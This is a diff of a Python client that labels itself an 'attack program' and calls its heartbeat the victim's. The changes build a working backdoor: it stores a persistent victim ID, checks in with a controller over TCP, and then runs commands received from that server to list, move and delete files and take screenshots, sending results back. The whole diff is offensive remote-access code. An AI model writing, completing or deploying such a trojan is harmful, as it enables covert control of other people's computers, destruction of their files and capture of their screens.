@@ -39,20 +39,20 @@ class WinControl():
 	def uuid_write(self):
 		#用于写入Windows的uuid唯一鉴别码
 		l = []
-		l.append(uuid.uuid4())
+		l.append(str(uuid.uuid4()))
 
 		with open(self.patha,'w') as ojbk:
 			json.dump(l,ojbk)
 
-		return None
+		return l[0]
 
 
 	def uuid_read(self):
 		#用于读取uuid码的函数
-		with open(filename) as zx:  
-    		number = json.load(zx) 
+		with open(self.patha) as zx:  
+			number = json.load(zx) 
 
-    	return number[0]
+		return number[0]
 
 
 	def where_i_am(self):
@@ -73,7 +73,7 @@ class WinControl():
 		else:
 			self.path = self.patha.split("\\")
 		
-		return None
+		return "None"
 
 
 	def rm(self):
@@ -91,7 +91,7 @@ class WinControl():
 
 		remove_dir(path)
 
-		return None
+		return "None"
 
 
 	def mv(self):
@@ -150,84 +150,120 @@ class WinControl():
 		mem_dc.DeleteDC()
 		win32gui.DeleteObject(screenshot.GetHandle())
 
-		return None
+		return "None"
 
 
 class Socketz():
 
 	def __init__(self,host,port,data=""):
+		self.data = data
 		self.host = host
 		self.port = port
-		self.data = data
-
+		self.sock = socket.socket()
 
 	def connect(self):
-		sock = socket.socket()
-		HOST = self.host
-		PORT = self.port
-		sock.connect((HOST, PORT))
-	 
+		self.sock.connect((self.host, self.port))
+
 
 	def heart(self):
 		#发送被害心跳的函数
-		sock.send("heart".encode("utf-8"))
-		my = sock.recv(1024).decode("utf-8")
+		self.sock.send("heart".encode("utf-8"))
+		my = self.sock.recv(1024).decode("utf-8")
 		#发送uuid
-		sock.send(self.data.encode("utf-8"))
-		server_rec = sock.recv(1024).decode("utf-8")
+		self.sock.send(self.data.encode("utf-8"))
+		server_rec = self.sock.recv(1024).decode("utf-8")
 
 		return server_rec
 
-	def 
-		
-		
+
+	def long_tcp(self):
+		while True:
+			cmd = self.sock.recv(1024).decode("utf-8")
+			print(cmd)
+			data = cmdx(cmd)
+			print(data)
+			self.sock.send(data.encode("utf-8"))
+
+	def stop(self):
+		self.sock.close()
 
 
 def cmdx(cmd):
 
 	if cmd[0] == "ls":
 		if len(cmd) > 1:
-			core.patha = cmd[1]
+			windows.patha = cmd[1]
 		else:
-			core.patha = "./"
-		p = core.ls()
-		print(p)
+			windows.patha = "./"
+		p = windows.ls()
+		return p
 
 
 	if cmd[0] == "we":
-		p = core.where_i_am()
-		print(p)
+		p = windows.where_i_am()
+		return p
 
 
 	if cmd[0] == "rm":
-		core.patha = cmd[1]
-		p = core.rm()
-		print(p)
+		windows.patha = cmd[1]
+		p = windows.rm()
+		return p
 
 
 	if cmd[0] == "cd":
-		core.patha = cmd[1]
-		p = core.cd()
-		print(p)
+		windows.patha = cmd[1]
+		p = windows.cd()
+		return p
 
 
 	if cmd[0] == "mv":
-		core.patha = cmd[1]
-		core.pathb = cmd[2]
-		p = core.mv()
-		print(p)
+		windows.patha = cmd[1]
+		windows.pathb = cmd[2]
+		p = windows.mv()
+		return p
 
 
 	if cmd[0] == "gp":
-		core.patha = cmd[1]
-		p = core.get_photo()
-		print(p)
+		windows.patha = cmd[1]
+		p = windows.get_photo()
+		return p
 
 
 
 def main():
 	print("攻击程序 客户端启动\n 核心主控程序")
-	
+
+
+	if os.path.exists(r"C:\sun32\center\windows"):
+		windows.patha = r"C:\sun32\center\windows\uuid.json"
+		uuid = windows.uuid_read()
+		print(uuid)
+
+	else:
+		
+		os.makedirs(r"C:\sun32\center\windows")
+		windows.patha = r"C:\sun32\center\windows\uuid.json"
+		uuid = windows.uuid_write()
+		print(uuid)
+
+
+	while True:
+		print("进入循环")
+
+		sockc = Socketz(host="127.0.0.1"\
+			,port=2233)
+		sockc.data = uuid
+		sockc.connect()
+
+		cmd = sockc.heart()
+		if cmd == "stop":
+			sockc.stop()
+			print("开始等待")
+			time.sleep(5)
+		if cmd == "start":
+			sockc.long_tcp()
+
+
 
 
 '''
@@ -239,12 +275,9 @@ def main():
 	if cmd[0] == "":
 '''
 
-core = WinControl()
-while True:
-
-	cmd = input(">>>")
-	cmd = cmd.split('@')
-	cmdx(cmd)
+if __name__=='__main__':
+	windows = WinControl()
+	main()
 
 
 
